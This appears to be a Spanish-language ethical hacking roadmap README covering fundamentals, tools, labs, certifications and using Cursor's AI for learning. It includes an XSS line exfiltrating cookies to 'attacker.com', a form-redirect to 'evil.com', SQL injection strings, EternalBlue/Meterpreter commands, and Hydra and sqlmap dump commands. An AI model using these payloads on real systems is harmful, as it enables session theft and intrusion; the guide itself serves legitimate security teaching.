# Ruta de Aprendizaje Hacker - Guía Completa

## Tu Camino para Convertirte en un Hacker Ético Profesional

Esta guía te llevará desde cero hasta convertirte en un profesional de ciberseguridad. Aprenderás hacking ético, pentesting, programación y cómo usar herramientas modernas como Cursor Editor para potenciar tu aprendizaje.

---

## Tabla de Contenidos

1. [Mentalidad del Hacker](#1-mentalidad-del-hacker)
2. [Fundamentos Esenciales](#2-fundamentos-esenciales)
3. [Programación para Hackers](#3-programación-para-hackers)
4. [Redes y Protocolos](#4-redes-y-protocolos)
5. [Sistemas Operativos](#5-sistemas-operativos)
6. [Herramientas de Hacking](#6-herramientas-de-hacking)
7. [Áreas de Especialización](#7-áreas-de-especialización)
8. [Uso de Cursor Editor para Hacking](#8-uso-de-cursor-editor-para-hacking)
9. [Práctica y Laboratorios](#9-práctica-y-laboratorios)
10. [Certificaciones](#10-certificaciones)
11. [Recursos Adicionales](#11-recursos-adicionales)
12. [Plan de Estudio](#12-plan-de-estudio)

---

## 1. Mentalidad del Hacker

### ¿Qué es un Hacker?
Un hacker es alguien con curiosidad insaciable por entender cómo funcionan los sistemas y encontrar formas de mejorarlos o explotarlos.

### Tipos de Hackers
- **White Hat (Sombrero Blanco)**: Hackers éticos que trabajan legalmente
- **Black Hat (Sombrero Negro)**: Hackers maliciosos (ILEGAL)
- **Grey Hat (Sombrero Gris)**: Entre ambos mundos
- **Bug Bounty Hunters**: Cazadores de vulnerabilidades por recompensas

### Principios Éticos
```
✓ Siempre obtener autorización escrita antes de hacer pruebas
✓ Nunca dañar sistemas o datos
✓ Reportar vulnerabilidades de manera responsable
✓ Respetar la privacidad de otros
✓ Usar tus habilidades para el bien
```

---

## 2. Fundamentos Esenciales

### 2.1 Conceptos Básicos de Informática

#### Hardware
- CPU, RAM, Almacenamiento
- Arquitectura de computadoras (32-bit vs 64-bit)
- Dispositivos de red (routers, switches, firewalls)

#### Software
- Sistemas operativos
- Aplicaciones y servicios
- Virtualización

### 2.2 Línea de Comandos

#### Linux/Bash (FUNDAMENTAL)
```bash
# Navegación
cd /ruta/directorio    # Cambiar directorio
ls -la                 # Listar archivos
pwd                    # Directorio actual

# Archivos
cat archivo.txt        # Ver contenido
nano archivo.txt       # Editar archivo
chmod 755 script.sh    # Cambiar permisos
chown user:group file  # Cambiar propietario

# Sistema
ps aux                 # Procesos activos
top                    # Monitor de recursos
df -h                  # Espacio en disco
free -m                # Memoria disponible

# Red
ifconfig / ip a        # Configuración de red
netstat -tulpn         # Puertos abiertos
ping host              # Probar conectividad
curl url               # Hacer peticiones HTTP
```

#### Windows PowerShell
```powershell
# Básicos
Get-Process            # Procesos
Get-Service            # Servicios
Get-NetIPAddress       # Configuración de red
Test-Connection host   # Ping

# Administración
Get-EventLog -LogName Security  # Logs de seguridad
Get-LocalUser                    # Usuarios locales
```

---

## 3. Programación para Hackers

### 3.1 Python (IMPRESCINDIBLE)

Python es el lenguaje más usado en ciberseguridad.

```python
# Ejemplo: Scanner de puertos básico
import socket

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

# Escanear puertos comunes
target = "192.168.1.1"
common_ports = [21, 22, 23, 25, 80, 443, 445, 3389]

for port in common_ports:
    if scan_port(target, port):
        print(f"[+] Puerto {port} ABIERTO")
```

#### Librerías Esenciales de Python para Hacking
```
- requests        → Peticiones HTTP
- scapy           → Manipulación de paquetes
- socket          → Conexiones de red
- paramiko        → SSH
- beautifulsoup4  → Web scraping
- pwntools        → Explotación
- impacket        → Protocolos de red
- cryptography    → Criptografía
```

### 3.2 Bash Scripting
```bash
#!/bin/bash
# Script de reconocimiento básico

TARGET=$1

echo "[*] Escaneando $TARGET"
echo "================================"

# Ping
echo "[*] Probando conectividad..."
ping -c 3 $TARGET

# DNS
echo "[*] Información DNS..."
nslookup $TARGET
dig $TARGET

# Whois
echo "[*] Información WHOIS..."
whois $TARGET
```

### 3.3 JavaScript (Para Web Hacking)
```javascript
// XSS Payload básico (para pruebas autorizadas)
<script>alert('XSS')</script>

// Extraer cookies (educativo)
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

// DOM manipulation
document.getElementById('form').action = 'http://evil.com/capture';
```

### 3.4 SQL (Para Inyecciones SQL)
```sql
-- Básico
SELECT * FROM users WHERE username='admin';

-- Inyección básica (para pruebas)
' OR '1'='1
' UNION SELECT username, password FROM users--
' AND 1=1--

-- Bypasses comunes
admin'--
admin'#
admin'/*
```

### 3.5 Otros Lenguajes Útiles
- **C/C++**: Exploits, malware analysis, bajo nivel
- **Assembly**: Reverse engineering
- **Go**: Herramientas modernas
- **Ruby**: Metasploit modules
- **PHP**: Web vulnerabilities

---

## 4. Redes y Protocolos

### 4.1 Modelo OSI
```
Capa 7 - Aplicación     → HTTP, FTP, SSH, DNS
Capa 6 - Presentación   → SSL/TLS, JPEG, ASCII
Capa 5 - Sesión         → NetBIOS, RPC
Capa 4 - Transporte     → TCP, UDP
Capa 3 - Red            → IP, ICMP, ARP
Capa 2 - Enlace         → Ethernet, Wi-Fi
Capa 1 - Física         → Cables, señales
```

### 4.2 Protocolos Importantes

#### TCP/IP
```
- IP: Direccionamiento (IPv4, IPv6)
- TCP: Conexión confiable (three-way handshake)
- UDP: Sin conexión, más rápido
- ICMP: Mensajes de control (ping)
```

#### Protocolos de Aplicación
```
- HTTP/HTTPS (80/443)  → Web
- FTP (21)             → Transferencia de archivos
- SSH (22)             → Shell segura
- Telnet (23)          → Shell insegura
- SMTP (25)            → Correo saliente
- DNS (53)             → Resolución de nombres
- SMB (445)            → Compartir archivos Windows
- RDP (3389)           → Escritorio remoto
```

### 4.3 Análisis de Tráfico con Wireshark
```
Filtros útiles:
- ip.addr == 192.168.1.1
- tcp.port == 80
- http
- dns
- tcp.flags.syn == 1
- frame contains "password"
```

---

## 5. Sistemas Operativos

### 5.1 Linux (Kali Linux)

Kali Linux es la distribución preferida para hacking.

#### Instalación
1. Descargar ISO de [kali.org](https://www.kali.org/)
2. Crear máquina virtual (VirtualBox/VMware)
3. Asignar mínimo 4GB RAM, 80GB disco

#### Herramientas Incluidas
```
Reconocimiento:    nmap, masscan, recon-ng
Web:               burpsuite, nikto, sqlmap
Wireless:          aircrack-ng, wifite
Passwords:         john, hashcat, hydra
Exploits:          metasploit, searchsploit
Forense:           autopsy, volatility
```

### 5.2 Windows

#### Conceptos de Seguridad Windows
```
- Active Directory
- Group Policies
- Windows Defender
- Registry
- Event Logs
- PowerShell Execution Policies
```

#### Herramientas de Windows
```
- Sysinternals Suite
- Process Monitor
- Process Explorer
- Autoruns
- TCPView
```

---

## 6. Herramientas de Hacking

### 6.1 Reconocimiento

#### Nmap (Network Mapper)
```bash
# Escaneo básico
nmap 192.168.1.1

# Escaneo de todos los puertos
nmap -p- 192.168.1.1

# Detección de servicios y versiones
nmap -sV 192.168.1.1

# Detección de sistema operativo
nmap -O 192.168.1.1

# Escaneo agresivo completo
nmap -A -T4 192.168.1.1

# Escaneo sigiloso
nmap -sS -T2 192.168.1.1

# Scripts de vulnerabilidades
nmap --script vuln 192.168.1.1
```

#### OSINT (Inteligencia de Fuentes Abiertas)
```
- theHarvester    → Emails, subdominios
- Shodan          → Dispositivos IoT
- Maltego         → Análisis de relaciones
- Google Dorks    → Búsqueda avanzada
- Recon-ng        → Framework de reconocimiento
```

### 6.2 Análisis de Vulnerabilidades

#### Nikto (Web Scanner)
```bash
nikto -h http://target.com
```

#### SQLMap (SQL Injection)
```bash
# Detectar inyección
sqlmap -u "http://target.com/page.php?id=1"

# Enumerar bases de datos
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Extraer tablas
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# Extraer datos
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
```

### 6.3 Explotación

#### Metasploit Framework
```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
search type:exploit platform:windows smb

# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar opciones
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50

# Ejecutar
exploit
```

#### Meterpreter (Post-Explotación)
```
# Comandos básicos
sysinfo              # Info del sistema
getuid               # Usuario actual
getsystem            # Escalar privilegios
hashdump             # Extraer hashes
screenshot           # Captura de pantalla
keyscan_start        # Keylogger
download file        # Descargar archivo
upload file          # Subir archivo
shell                # Shell del sistema
```

### 6.4 Cracking de Contraseñas

#### John the Ripper
```bash
# Crackear hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Mostrar contraseñas crackeadas
john --show hashes.txt
```

#### Hashcat
```bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt

# SHA256
hashcat -m 1400 hash.txt wordlist.txt
```

#### Hydra (Fuerza Bruta Online)
```bash
# SSH
hydra -l admin -P wordlist.txt ssh://192.168.1.1

# HTTP POST
hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

### 6.5 Web Hacking

#### Burp Suite
```
1. Configurar proxy (127.0.0.1:8080)
2. Interceptar tráfico
3. Modificar peticiones
4. Usar Repeater para pruebas
5. Intruder para fuzzing
```

#### OWASP Top 10 (Vulnerabilidades más comunes)
```
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Software Integrity Failures
9. Logging Failures
10. Server-Side Request Forgery (SSRF)
```

---

## 7. Áreas de Especialización

### 7.1 Web Application Security
```
- XSS (Cross-Site Scripting)
- SQL Injection
- CSRF (Cross-Site Request Forgery)
- SSRF (Server-Side Request Forgery)
- File Upload Vulnerabilities
- Authentication Bypass
- Session Hijacking
```

### 7.2 Network Security
```
- Firewall Bypass
- IDS/IPS Evasion
- Man-in-the-Middle Attacks
- ARP Spoofing
- DNS Poisoning
- Port Forwarding/Tunneling
```

### 7.3 Wireless Security
```
- WEP/WPA/WPA2 Cracking
- Evil Twin Attacks
- Deauthentication Attacks
- Rogue Access Points
```

### 7.4 Mobile Security
```
- Android: APK analysis, rooting
- iOS: Jailbreaking, IPA analysis
- Mobile app pentesting
```

### 7.5 Reverse Engineering
```
- Análisis estático
- Análisis dinámico
- Debugging
- Disassembly
- Decompilation
```

### 7.6 Malware Analysis
```
- Análisis de comportamiento
- Análisis de código
- Sandboxing
- Indicadores de compromiso (IOCs)
```

### 7.7 Cloud Security
```
- AWS/Azure/GCP Security
- Container Security (Docker, Kubernetes)
- Serverless Security
```

---

## 8. Uso de Cursor Editor para Hacking

Cursor Editor es una herramienta poderosa que puede acelerar tu aprendizaje de hacking.

### 8.1 Configuración Inicial

```
1. Instalar Cursor desde cursor.sh
2. Configurar extensiones de seguridad
3. Conectar con tu cuenta para IA
```

### 8.2 Extensiones Recomendadas
```
- Python                  → Desarrollo de scripts
- Remote - SSH            → Conectar a máquinas remotas
- GitLens                 → Control de versiones
- Hex Editor              → Análisis binario
- REST Client             → Pruebas de API
- YAML                    → Configuraciones
- Docker                  → Contenedores
```

### 8.3 Usar la IA de Cursor para Hacking

#### Aprender Conceptos
```
Pregunta: "Explícame cómo funciona un ataque de SQL Injection 
          y cómo prevenirlo"

Pregunta: "¿Cuál es la diferencia entre XSS reflejado y almacenado?"

Pregunta: "Cómo funciona el protocolo TCP three-way handshake"
```

#### Crear Scripts de Seguridad
```
Prompt: "Crea un script en Python que escanee puertos TCP 
         de un host dado"

Prompt: "Escribe un script de Bash para automatizar 
         reconocimiento de subdominios"

Prompt: "Genera un script Python para detectar si un 
         servidor web tiene headers de seguridad configurados"
```

#### Analizar Código
```
Prompt: "Analiza este código PHP y encuentra vulnerabilidades 
         de seguridad"

Prompt: "¿Qué vulnerabilidades tiene esta función de login?"

Prompt: "Sugiere mejoras de seguridad para este código"
```

#### Entender Exploits
```
Prompt: "Explícame cómo funciona el exploit EternalBlue"

Prompt: "¿Qué hace este shellcode?"

Prompt: "Analiza este CVE y explica el vector de ataque"
```

### 8.4 Proyectos para Practicar con Cursor

#### Proyecto 1: Port Scanner Avanzado
```python
# Pide a Cursor que te ayude a crear:
# - Scanner multi-threaded
# - Detección de servicios
# - Exportar resultados a JSON
# - Interfaz de línea de comandos
```

#### Proyecto 2: Web Vulnerability Scanner
```python
# Desarrolla con ayuda de Cursor:
# - Detector de XSS
# - Detector de SQL Injection
# - Análisis de headers de seguridad
# - Generación de reportes
```

#### Proyecto 3: Network Sniffer
```python
# Crea con Cursor:
# - Captura de paquetes
# - Filtrado por protocolo
# - Análisis de payloads
# - Detección de anomalías
```

### 8.5 Workflow Recomendado

```
1. Define el problema/herramienta que quieres crear
2. Pide a Cursor un esqueleto del código
3. Entiende cada parte del código generado
4. Modifica y mejora según tus necesidades
5. Prueba en entornos controlados
6. Documenta lo aprendido
```

---

## 9. Práctica y Laboratorios

### 9.1 Plataformas de Práctica (LEGALES)

#### CTF (Capture The Flag)
```
- HackTheBox      → hackthebox.com
- TryHackMe       → tryhackme.com
- PicoCTF         → picoctf.org
- CTFtime         → ctftime.org
- OverTheWire     → overthewire.org
```

#### Laboratorios Vulnerables
```
- DVWA            → Damn Vulnerable Web Application
- WebGoat         → OWASP WebGoat
- Metasploitable  → Máquina vulnerable
- VulnHub         → Máquinas virtuales
- HackTheBox Labs → Laboratorios dedicados
```

### 9.2 Crear tu Propio Laboratorio

#### Con VirtualBox/VMware
```
1. Instalar virtualizador
2. Descargar ISOs:
   - Kali Linux (atacante)
   - Metasploitable (víctima)
   - Windows vulnerable (víctima)
3. Crear red interna aislada
4. Practicar ataques de forma segura
```

#### Con Docker
```bash
# DVWA
docker run -d -p 80:80 vulnerables/web-dvwa

# WebGoat
docker run -d -p 8080:8080 webgoat/webgoat

# Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

### 9.3 Ruta de Práctica Recomendada

```
Nivel 1 - Principiante:
├── TryHackMe - Complete Beginner Path
├── OverTheWire - Bandit
└── PicoCTF challenges

Nivel 2 - Intermedio:
├── HackTheBox - Easy machines
├── TryHackMe - Offensive Pentesting
└── PortSwigger Web Academy

Nivel 3 - Avanzado:
├── HackTheBox - Medium/Hard machines
├── CTF competitions
└── Bug Bounty programs
```

---

## 10. Certificaciones

### 10.1 Certificaciones Recomendadas

#### Nivel Inicial
```
- CompTIA Security+
- CompTIA Network+
- eJPT (eLearnSecurity Junior Penetration Tester)
```

#### Nivel Intermedio
```
- CEH (Certified Ethical Hacker)
- OSCP (Offensive Security Certified Professional) ⭐
- eCPPT (eLearnSecurity Certified Professional Penetration Tester)
```

#### Nivel Avanzado
```
- OSCE (Offensive Security Certified Expert)
- OSWE (Offensive Security Web Expert)
- GPEN (GIAC Penetration Tester)
- GWAPT (GIAC Web Application Penetration Tester)
```

### 10.2 Ruta de Certificación Recomendada
```
1. Security+ → Fundamentos
2. eJPT → Primera certificación práctica
3. OSCP → Estándar de la industria
4. Especialización según área de interés
```

---

## 11. Recursos Adicionales

### 11.1 Libros Recomendados
```
Fundamentos:
- "The Web Application Hacker's Handbook"
- "Hacking: The Art of Exploitation"
- "Penetration Testing" por Georgia Weidman
- "Black Hat Python"

Avanzados:
- "The Shellcoder's Handbook"
- "Practical Malware Analysis"
- "Red Team Field Manual"
- "The Hacker Playbook" (1, 2, 3)
```

### 11.2 Canales de YouTube
```
- NetworkChuck
- John Hammond
- LiveOverflow
- IppSec (HTB walkthroughs)
- The Cyber Mentor
- David Bombal
- HackerSploit
```

### 11.3 Blogs y Sitios Web
```
- PortSwigger Research
- OWASP
- Hacker News
- Krebs on Security
- Dark Reading
- Security Weekly
```

### 11.4 Comunidades
```
- Reddit: r/netsec, r/hacking, r/AskNetsec
- Discord: HackTheBox, TryHackMe, InfoSec
- Twitter: Seguir investigadores de seguridad
- GitHub: Proyectos de seguridad
```

---

## 12. Plan de Estudio

### Mes 1-2: Fundamentos
```
Semana 1-2:
□ Instalar Kali Linux en VM
□ Aprender comandos básicos de Linux
□ Completar OverTheWire Bandit (niveles 0-15)

Semana 3-4:
□ Fundamentos de redes (modelo OSI, TCP/IP)
□ Instalar Wireshark y analizar tráfico
□ Comenzar TryHackMe - Complete Beginner

Semana 5-8:
□ Aprender Python básico
□ Crear primeros scripts de seguridad
□ Usar Cursor para acelerar aprendizaje
```

### Mes 3-4: Herramientas y Técnicas
```
Semana 9-12:
□ Dominar Nmap
□ Aprender Burp Suite
□ Practicar en DVWA

Semana 13-16:
□ Metasploit Framework
□ SQL Injection y XSS
□ TryHackMe - Web Fundamentals
```

### Mes 5-6: Práctica Intensiva
```
Semana 17-20:
□ HackTheBox - Primeras máquinas Easy
□ PortSwigger Web Security Academy
□ Desarrollar herramientas propias

Semana 21-24:
□ Participar en CTFs
□ Máquinas HTB Medium
□ Preparación para certificación
```

### Mes 7+: Especialización
```
□ Elegir área de especialización
□ Obtener primera certificación (eJPT/OSCP)
□ Bug Bounty programs
□ Construir portfolio de proyectos
□ Networking con la comunidad
```

---

## Checklist de Progreso

### Fundamentos
- [ ] Linux command line proficiency
- [ ] Redes básicas (OSI, TCP/IP)
- [ ] Python básico
- [ ] Bash scripting
- [ ] Git básico

### Herramientas
- [ ] Nmap
- [ ] Burp Suite
- [ ] Metasploit
- [ ] Wireshark
- [ ] SQLMap
- [ ] John/Hashcat
- [ ] Hydra

### Conceptos de Ataque
- [ ] SQL Injection
- [ ] XSS
- [ ] CSRF
- [ ] Directory Traversal
- [ ] File Upload
- [ ] Authentication Bypass
- [ ] Privilege Escalation

### Práctica
- [ ] 10+ máquinas HTB/THM
- [ ] 5+ CTFs participados
- [ ] 3+ herramientas propias creadas
- [ ] 1+ certificación obtenida

---

## Notas Importantes

### Aspectos Legales
```
⚠️ SIEMPRE practica en entornos autorizados
⚠️ NUNCA ataques sistemas sin permiso escrito
⚠️ El hacking no autorizado es ILEGAL
⚠️ Las consecuencias pueden incluir multas y prisión
```

### Consejos Finales
```
✓ La práctica constante es clave
✓ Documenta todo lo que aprendes
✓ Únete a comunidades
✓ Comparte conocimiento
✓ Mantente actualizado
✓ Sé paciente - esto toma tiempo
✓ Usa Cursor para acelerar tu aprendizaje
```

---

## Contacto y Contribuciones

Si tienes preguntas o quieres contribuir a esta guía, ¡no dudes en abrir un issue o pull request!

---

**Recuerda: Con gran poder viene gran responsabilidad. Usa tus habilidades de forma ética y legal.**

---

*Última actualización: Enero 2026*
